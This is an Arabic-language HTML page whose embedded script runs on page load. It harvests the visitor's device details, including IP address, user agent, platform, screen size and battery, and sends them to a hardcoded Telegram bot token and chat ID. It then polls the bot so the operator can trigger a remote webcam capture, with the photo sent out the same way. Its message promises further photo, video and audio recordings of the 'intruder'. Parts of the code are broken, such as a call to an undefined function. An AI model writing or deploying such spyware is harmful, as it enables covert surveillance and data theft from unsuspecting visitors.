<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إرسال بيانات جهاز إلى تلجرام</title>
</head>
<body>

    <h1>بيانات جهازك يتم إرسالها الآن...</h1>

    <script>
      const token = "7782080900:AAGvcMWaE_IAbb_0_0-HwcyCvQUUUVxBYmc";
      const chat_id = "5932979028";

      // دالة إرسال رسالة نصية مع زر
      async function sendToTelegramWithButton() {
        const message = "اضغط على الزر لالتقاط صورة:";
        const inlineKeyboard = {
          inline_keyboard: [
            [
              {
                text: "التقط صورة",
                callback_data: "capture_photo"
              }
            ]
          ]
        };

        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id,
            text: message,
            reply_markup: inlineKeyboard
          })
        });
      }

      // دالة التقاط صورة وإرسالها
      async function captureAndSendPhoto() {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          const track = stream.getVideoTracks()[0];
          const imageCapture = new ImageCapture(track);

          // التقاط صورة
          const blob = await imageCapture.takePhoto();
          await sendPhoto(blob);  // إرسال الصورة عبر البوت

          track.stop(); // إيقاف الكاميرا
        } catch (e) {
          console.warn("فشل التقاط الصورة:", e);
        }
      }

      // دالة إرسال الصورة عبر البوت
      async function sendPhoto(blob) {
        const formData = new FormData();
        formData.append("chat_id", chat_id);
        formData.append("photo", blob, "photo.jpg");

        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: "POST",
          body: formData
        });
      }

      // التعامل مع ضغط الزر من المستخدم
      async function handleTelegramCallback(data) {
        if (data.callback_query.data === "capture_photo") {
          await captureAndSendPhoto();
        }
      }

      // استلام التحديثات من البوت (التعامل مع الضغطات على الأزرار)
      async function getUpdates() {
        const response = await fetch(`https://api.telegram.org/bot${token}/getUpdates`);
        const data = await response.json();
        if (data.result && data.result.length > 0) {
          for (const update of data.result) {
            if (update.callback_query) {
              await handleTelegramCallback(update.callback_query);
            }
          }
        }
      }

      // إرسال البيانات إلى تلجرام عند فتح الصفحة
      async function sendDeviceInfo() {
        const battery = await navigator.getBattery();
        const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json()).catch(() => ({}));
        const msg = `
          👑 شادو، هناك دخيل جدي 👑
          🌐 بيــانـات الجهاز 🌐
          • المـقـــــــــــع: ${location.href}
          • إســـم الجهـاز: ${navigator.userAgent}
          • IP Phon: ${ip.ip || "غير معروف"}
          • اللغة: ${navigator.language}
          • النظام: ${navigator.platform}
          • حجم الشاشة: ${screen.width}x${screen.height}
          • البطارية: ${battery.level * 100}% ${battery.charging ? '🔌' : '🔋'}
          
          📸 صور: 10 سيتم إرسالها
          🎬 فيديو: سيتم تسجيله لاحقًا
          🎤 صوت: 10 تسجيلات قادمة
        `;
        await sendToTelegram(msg);
      }

      // بدء السكربت عند تحميل الصفحة
      window.onload = async () => {
        // إرسال الزر عند فتح الصفحة
        await sendToTelegramWithButton();
        await sendDeviceInfo();

        // استلام التحديثات (الضغطات على الأزرار) بشكل مستمر
        setInterval(getUpdates, 1000); // تحقق من التحديثات كل ثانية
      };
    </script>

</body>
</html>
